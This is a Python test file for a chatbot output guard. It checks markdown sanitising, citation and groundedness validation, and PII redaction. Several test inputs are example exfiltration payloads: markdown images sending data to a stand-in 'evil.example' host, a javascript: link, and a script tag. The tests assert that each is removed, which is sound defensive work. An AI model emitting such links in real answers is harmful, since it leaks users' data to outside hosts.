import json

from chatbot.core.types import Chunk
from chatbot.guard.output import (
    GroundednessChecker,
    OutputGuard,
    sanitize_markdown,
    split_claims,
    validate_citations,
)
from chatbot.guard.policies import GroundednessPolicy, OutputGuardPolicy
from chatbot.guard.verdicts import OutputAction
from chatbot.llm.fake import FakeLLM

SOURCES = [
    Chunk(
        chunk_id="c1",
        doc_id="d1",
        text="Employees accrue 20 days of paid vacation per year. Unused vacation days roll over up to 5 days.",
    ),
    Chunk(
        chunk_id="c2",
        doc_id="d2",
        text="Expense reports must be submitted within 30 days through the Concur portal.",
    ),
]


def test_markdown_image_exfil_stripped():
    text = "Here you go ![x](https://evil.example/log?d=SECRET_DATA) and more."
    r = sanitize_markdown(text, ["docs.acme.com"])
    assert "evil.example" not in r.text
    assert "markdown_image_removed" in r.flags


def test_allowlisted_image_and_link_kept_others_unlinked():
    text = (
        "See [the guide](https://docs.acme.com/vpn) and [this](https://evil.example/?q=1) "
        "![logo](https://cdn.docs.acme.com/logo.png) <img src='https://evil.example/p.gif'> "
        "[js](javascript:alert(1)) raw https://evil.example/x?y=1."
    )
    r = sanitize_markdown(text, ["docs.acme.com"])
    assert "[the guide](https://docs.acme.com/vpn)" in r.text
    assert "![logo](https://cdn.docs.acme.com/logo.png)" in r.text
    assert "evil.example" not in r.text
    assert "javascript:" not in r.text
    assert "this" in r.text  # link text kept
    assert "[link removed]." in r.text


def test_reference_style_image_and_html():
    text = "Look ![a][img]\n\n[img]: https://evil.example/i.png?c=1\n<script>steal()</script><b>bold</b>"
    r = sanitize_markdown(text, [])
    assert "evil.example" not in r.text
    assert "steal" not in r.text
    assert "bold" in r.text and "<b>" not in r.text


def test_citation_validation():
    c = validate_citations("A [1]. B [2, 5]. C [7]", 2)
    assert c.cited == [1, 2] and c.invalid == [5, 7]


def test_split_claims_skips_meta():
    claims = split_claims("Here is the answer.\n- Employees accrue 20 vacation days [1].\n# Heading")
    assert claims == ["Employees accrue 20 vacation days [1]."]


def test_groundedness_flags_unsupported_claim():
    checker = GroundednessChecker()
    answer = (
        "Employees accrue 20 days of paid vacation per year [1]. "
        "Managers receive a company car after two years of service [1]."
    )
    r = checker.cheap(answer, SOURCES)
    assert not r.grounded
    assert r.unsupported == ["Managers receive a company car after two years of service [1]."]


def test_wrong_number_is_unsupported():
    r = GroundednessChecker().cheap("Employees accrue 25 days of paid vacation per year [1].", SOURCES)
    assert r.unsupported


async def test_output_guard_regenerate_then_fallback():
    guard = OutputGuard(OutputGuardPolicy(max_regenerations=1))
    bad = "Employees get unlimited vacation and free lunches every single day [1]."
    v0 = await guard.check(bad, SOURCES, attempt=0)
    assert v0.action is OutputAction.REGENERATE and "ungrounded" in v0.flags
    v1 = await guard.check(bad, SOURCES, attempt=1)
    assert v1.action is OutputAction.FALLBACK
    assert v1.text == guard.policy.fallback_text


async def test_output_guard_delivers_grounded_and_sanitized():
    guard = OutputGuard()
    ans = (
        "Expense reports must be submitted within 30 days through the Concur portal [2]. "
        "![t](https://evil.example/?q=leak)"
    )
    v = await guard.check(ans, SOURCES)
    assert v.action is OutputAction.DELIVER, v
    assert "evil.example" not in v.text


async def test_invalid_citation_regenerates():
    v = await OutputGuard().check("Employees accrue 20 days of paid vacation per year [4].", SOURCES)
    assert v.action is OutputAction.REGENERATE
    assert v.invalid_citations == [4]


async def test_output_pii_redacted_unless_in_sources():
    srcs = [Chunk(chunk_id="c", doc_id="d", text="Contact support at help@acme.com for VPN access requests.")]
    v = await OutputGuard().check(
        "Contact support at help@acme.com for VPN access requests [1]. Bob's email is bob@private.net.",
        srcs,
    )
    assert "help@acme.com" in v.text
    assert "bob@private.net" not in v.text


async def test_two_tier_judge_only_when_borderline():
    calls = []

    def judge(req):
        calls.append(req)
        return json.dumps({"grounded": True, "score": 0.9, "unsupported_claims": [], "reason": "ok"})

    pol = GroundednessPolicy(low=0.3, high=0.75)
    checker = GroundednessChecker(pol, llm=FakeLLM(handler=judge))
    # clearly grounded -> no LLM
    r = await checker.check("Employees accrue 20 days of paid vacation per year [1].", SOURCES)
    assert r.grounded and not r.judge_used and not calls
    # borderline (paraphrase) -> LLM judge
    r = await checker.check(
        "Staff accrue 20 days of paid vacation annually, and leftover days carry forward [1].", SOURCES
    )
    assert r.judge_used and r.grounded and len(calls) == 1
    assert "<sources>" in calls[0].messages[0].content


async def test_abstention_delivered():
    v = await OutputGuard().check("I don't know based on the available documents.", SOURCES, abstained=True)
    assert v.action is OutputAction.DELIVER
